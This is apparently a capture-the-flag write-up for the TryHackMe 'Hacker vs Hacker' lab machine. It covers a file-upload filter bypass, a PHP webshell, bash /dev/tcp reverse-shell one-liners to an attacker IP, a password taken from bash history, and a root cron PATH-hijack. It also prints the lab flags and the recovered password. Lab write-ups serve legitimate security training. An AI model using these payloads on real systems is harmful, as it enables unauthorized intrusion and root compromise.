# 🥷 TryHackMe — Hacker vs Hacker

> **Web Enumeration | File Upload Bypass | Webshell | Remote Command Execution | Credential Discovery | SSH | Cron Misconfiguration | PATH Hijacking | Privilege Escalation**

![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Linux%20Privilege%20Escalation-red?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

---

## 📌 Overview

**Hacker vs Hacker** is a TryHackMe Linux machine focused on web application enumeration, insecure file uploads, remote command execution, credential discovery, SSH access, and Linux privilege escalation.

The machine hosts a recruitment website called **RecruitSec**. The website contains a CV upload functionality that attempts to restrict uploaded files to PDF documents.

However, the upload validation can be bypassed by manipulating the filename.

This allows a PHP webshell to be uploaded and executed on the server, providing command execution as the `www-data` user.

After obtaining access, the `/home/lachlan` directory is investigated. The user's `.bash_history` contains credentials that can be reused to obtain SSH access as `lachlan`.

Further enumeration reveals a custom cron configuration:

```text
PATH=/home/lachlan/bin:/bin:/usr/bin
* * * * * root backup.sh
```
Because `/home/lachlan/bin` appears first in the root cron job's `PATH`, a malicious `backup.sh` placed there can be executed by root.

This results in a root reverse shell

---

# 🎯 Attack Path


```
Nmap Enumeration
       │
       ▼
RecruitSec Web Application
       │
       ▼
CV Upload Function
       │
       ▼
Upload Validation Bypass
       │
       ▼
PHP Webshell
       │
       ▼
www-data Shell
       │
       ▼
Lachlan Enumeration
       │
       ▼
.bash_history
       │
       ▼
Password Discovery
       │
       ▼
SSH as lachlan
       │
       ▼
Cron Enumeration
       │
       ▼
PATH Hijacking
       │
       ▼
Malicious backup.sh
       │
       ▼
Root Reverse Shell
       │
       ▼
🏆 Root Flag
```

---

# 🔎 1. Initial Enumeration
I started with an Nmap service and version scan against the target.
```
nmap -sV -A <TARGET_IP>
```

<img width="700" height="258" alt="1" src="https://github.com/user-attachments/assets/4943aa7e-be28-41d0-967d-d0cb2916556c" />

The scan identified two open TCP ports:
```
22/tcp    open    ssh
80/tcp    open    http
```

The HTTP service was running an application called:
```
RecruitSec
```
This became the primary target for further enumeration.

---

# 🌐 2. Web Enumeration
I opened the web server:
```
http://<TARGET_IP>
```
The website displayed a recruitment-themed page.

 <img width="1249" height="571" alt="2" src="https://github.com/user-attachments/assets/4b92c98e-e59b-4c06-ad49-6b9c317b1ac1" />

<img width="909" height="300" alt="2-2" src="https://github.com/user-attachments/assets/cdbebc26-3b34-4b0e-b0db-d530024aec7a" />

The page contained a CV upload form.
The website stated that users could upload their CV for consideration.
This functionality was interesting because file upload features can sometimes lead to arbitrary file upload or remote code execution if the server-side validation is weak.

---

# 📤 3. Investigating the File Upload
The upload functionality was located at:
```
/upload.php
```
I inspected the source code of the upload page.
```
http://<TARGET_IP>/upload.php
```

 <img width="785" height="375" alt="2-3" src="https://github.com/user-attachments/assets/0f9ed862-d664-4f85-8e00-6806d79273aa" />

The source code contained the following validation logic:

```
$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
    echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
    echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "Success! We will get back to you.";
}
```
Two important observations were made.

## Upload Directory

The source code revealed:
```
$target_dir = "cvs/";
```
Therefore, uploaded files should be stored under:
```
/cvs/
```
This was the next directory to investigate.

## Weak File Extension Validation

The application checks:
```
strpos($target_file, ".pdf")
```
This does not strictly verify that the file ends with `.pdf`.

---

# 4. 📂 Checking the /cvs/ Directory

Since the source code explicitly revealed:
```
$target_dir = "cvs/";
```
the next step was to check the directory:
```
http://<TARGET_IP>/cvs/
```
<img width="646" height="124" alt="3" src="https://github.com/user-attachments/assets/e43d9ee5-f729-49fd-a470-4bf5c9c0835f" />



This step confirmed that the `/cvs/` location was accessible and was the directory associated with uploaded files.

The attack path was therefore:
```
Source Code
     ↓
$target_dir = "cvs/"
     ↓
/cvs/
```

---

# 5. 🧪 Bypassing the Upload Validation

Based on the source-code analysis, a filename containing `.pdf` but ending in `.php` could potentially bypass the application's check.

The filename used was:
```
shell.pdf.php
```
The important point is that:
```
shell.pdf.php
     ↑
   contains ".pdf"
```
while still ending with:
```
.php
```
If the web server executes `PHP` files inside the upload directory, this can result in arbitrary PHP code execution.

---

# 6. 🔎 Locating the Uploaded File with ffuf

After identifying the /cvs/ directory and the filename pattern, ffuf was used to locate the uploaded file.

Command:
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://<TARGET_IP>/cvs/FUZZ.pdf.php
```

<img width="950" height="589" alt="4" src="https://github.com/user-attachments/assets/a121162a-3016-44bc-9a1b-ea6da6938768" />

The scan returned a successful result corresponding to:
```
shell.pdf.php
```
Therefore, the uploaded file could be accessed at:
```
http://<TARGET_IP>/cvs/shell.pdf.php
```
The attack chain had now progressed to:
```
Upload bypass
      ↓
shell.pdf.php
      ↓
/cvs/shell.pdf.php
```

---

# 7. 💻 Accessing the Uploaded PHP File

The discovered file was accessed directly:
```
http://<TARGET_IP>/cvs/shell.pdf.php
```

<img width="661" height="107" alt="5" src="https://github.com/user-attachments/assets/d8b23cf4-0cb8-41db-b112-02be8a0e6c71" />

The response contained:
```
boom!
```
This indicated that the uploaded PHP file was being processed by the server.

At this point, the next step was to determine whether the file accepted commands.

---

# 8. ⚡ Testing Remote Command Execution

The cmd parameter was tested with the standard Linux id command:
```
http://<TARGET_IP>/cvs/shell.pdf.php?cmd=id
```
<img width="732" height="145" alt="6" src="https://github.com/user-attachments/assets/037b59bf-dc27-419a-8e2c-dcaf455e9ff7" />

The server returned:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
This was a critical finding.

The command was executed by the web server as:
```
www-data
```
Therefore, this was **Remote Code Execution (RCE)** through the uploaded PHP web shell.

---

# 9. 📁 Enumerating the Web Shell Environment

The uploaded shell could also be used to execute commands such as `ls`.

<img width="738" height="161" alt="7" src="https://github.com/user-attachments/assets/db22cd8f-5555-4071-baf6-5924def665c5" />

The output showed files including:
`
index.html
shell.pdf.php
`
This confirmed that the shell was operating inside the web server's directory.

---

# 10. 👤 Enumerating the lachlan User

The next step was to inspect the home directory of the user discovered on the system.

The following command was executed through the web shell:
```
ls /home/lachlan
```

<img width="821" height="120" alt="8" src="https://github.com/user-attachments/assets/4290a205-76dc-48ee-bb7d-fd0ddf06849b" />

The output included:
```
bin
user.txt
```
This indicated that the user lachlan had a home directory containing a user.txt flag.

---

# 11. 🚩 Capturing the User Flag

The user flag was read using:The output included:
```
bin
user.txt
```
This indicated that the user `lachlan` had a home directory containing a user.txt flag.

```
cat /home/lachlan/user.txt
```
<img width="882" height="116" alt="9" src="https://github.com/user-attachments/assets/3a58adc8-b607-4762-adac-7afce8d8d4be" />

The flag was:
```
thm{af7e46b68081d4025c5ce10851430617}
```
# 12. 🔄 Getting a Reverse Shell

A reverse shell was prepared so that the target would connect back to the attacker's machine.

The payload used was:
```
bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4848 0>&1'
```

<img width="831" height="191" alt="10-1" src="https://github.com/user-attachments/assets/00d8114c-e848-4f62-97ae-4abf8b1a1344" />

Before triggering the reverse shell, a Netcat listener was started on the attacker machine:
```
nc -lvnp 4848
```
<img width="634" height="125" alt="10-2" src="https://github.com/user-attachments/assets/1e1068fe-d9f6-4e97-b8a2-f158f8aacf67" />

The incoming connection provided a shell as:
```
www-data
```
The shell prompt showed:
```
www-data@b2r:/var/www/html/cvs$
```

---

# 13. 🔍 Enumerating the lachlan Home Directory

From the reverse shell, the lachlan home directory was examined:
```
cd /home/lachlan
ls -la
```

<img width="504" height="239" alt="11" src="https://github.com/user-attachments/assets/5117603b-cb3e-4164-8f5b-29f98235d91b" />

The directory contained files including:
```
.bash_history
.bash_logout
.bashrc
.cache
.profile
bin
user.txt
```
The `.bash_history` file was particularly interesting because it can contain previously executed commands.

---

# 14. 🔑 Discovering Credentials in .bash_history

The Bash history was examined:
```
cat .bash_history
```

<img width="593" height="122" alt="12" src="https://github.com/user-attachments/assets/25db293d-412e-4d4d-897b-4c5bb9e4822d" />

The history contained:
```
./eve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHYSpzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ln -sf /dev/null /home/lachlan/.bash_history
```
The most interesting command was:
```
echo -e "dHYSpzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
```
This revealed the password:
```
thisistheway123
```
The history also revealed an important privilege-escalation clue:
```
vi /etc/cron.d/persistence
```
This suggested that `/etc/cron.d/persistence` could be important for the next stage.

---

# 15. 🔐 SSH Access as lachlan

The recovered credentials could be tested against the SSH service discovered during the initial Nmap scan.

Command
```
ssh lachlan@<TARGET_IP>
```

<img width="605" height="490" alt="13" src="https://github.com/user-attachments/assets/bd15fb75-77b0-4a89-aff1-c297b400eed6" />

Using the recovered password:
```
thisistheway123
```
SSH access was successfully obtained as:
```
lachlan
```
This was an important privilege transition:
```
www-data
    ↓
Recovered password
    ↓
SSH
    ↓
lachlan
```

---

# 16. ⏰ Investigating the Cron Configuration

The `.bash_history` had revealed:
```
cat /etc/cron.d/persistence
```
The cron configuration was then examined.

<img width="1021" height="169" alt="14" src="https://github.com/user-attachments/assets/998fc3ee-7b70-4020-821c-d1b8ab2501cd" />

The important section was:
```
PATH=/home/lachlan/bin:/bin:/usr/bin

* * * * * root backup.sh
```
This configuration is highly significant.

The cron job executes:
```
backup.sh
```
as:
```
root
```
However, the command does not specify an absolute path.

At the same time, the PATH begins with:
```
/home/lachlan/bin
```
Therefore, when root's cron job attempts to execute:
```
backup.sh
```
the system searches the directories in PATH.

The first directory is:
```
/home/lachlan/bin
```
This creates a **PATH hijacking privilege-escalation opportunity**.

---

# 17. 🚨 Understanding the PATH Hijacking Vulnerability

The relevant configuration is:
```
PATH=/home/lachlan/bin:/bin:/usr/bin
```
followed by:
```
* * * * * root backup.sh
```
The important problem is:
```
backup.sh
```
is executed without an absolute path.

Instead of:
```
/usr/local/bin/backup.sh
```
or:
```
/root/backup.sh
```
the cron job simply calls:
```
backup.sh
```
Because:
```
/home/lachlan/bin
```
comes first in PATH, a malicious executable named:
```
backup.sh
```
placed inside:
```
/home/lachlan/bin/
```
can be selected by the cron job.

Since cron executes the command as:
```
root
```
the malicious script can execute with root privileges.

---

# 18. 📝 Creating the Malicious backup.sh

Based on the vulnerable cron configuration, a malicious backup.sh can be placed in:
```
/home/lachlan/bin/
```
For example:
```
cd /home/lachlan/bin
nano backup.sh
```
The script can contain:
```
#!/bin/bash\nbash -i >& /dev/tcp/<KALI_IP>/4848 0>&1
```
<img width="762" height="73" alt="15-1" src="https://github.com/user-attachments/assets/ffa11f60-16a5-45c4-8112-d683c1be6edc" />

Then make it executable:
```
chmod +x backup.sh
```
<img width="504" height="40" alt="15-2" src="https://github.com/user-attachments/assets/2e5d1be7-bf3a-4ef3-992b-4947aabec117" />

The important concept is:
```
/home/lachlan/bin/backup.sh
```
is being placed before the legitimate locations in the PATH.

When the cron job executes:
```
backup.sh
```
it can therefore execute the attacker's version.

---

# 19. 🎧 Catching the Root Reverse Shell

A listener was started on the attacker machine:
```
nc -lvnp 4848
```
After the cron job executed the malicious `backup.sh`, a connection was received.

<img width="661" height="111" alt="15-3" src="https://github.com/user-attachments/assets/cdbf0057-56f7-4893-ad44-2a77bcdfb8ab" />

The resulting shell was:
```
root@b2r:~#
```
This confirmed successful privilege escalation.

---

# 20. 👑 Confirming Root Access

Once the root shell was obtained, the current directory was inspected:
```
ls
```
<img width="320" height="143" alt="16" src="https://github.com/user-attachments/assets/3389e62b-2458-43ad-836c-c4292ee83f22" />

The output contained:
```
root.txt
snap
```
The root flag was then read:
```
cat root.txt
```
The root flag was:
```
thm{7b08e524ff666d3562647816ee2a1d4}
```
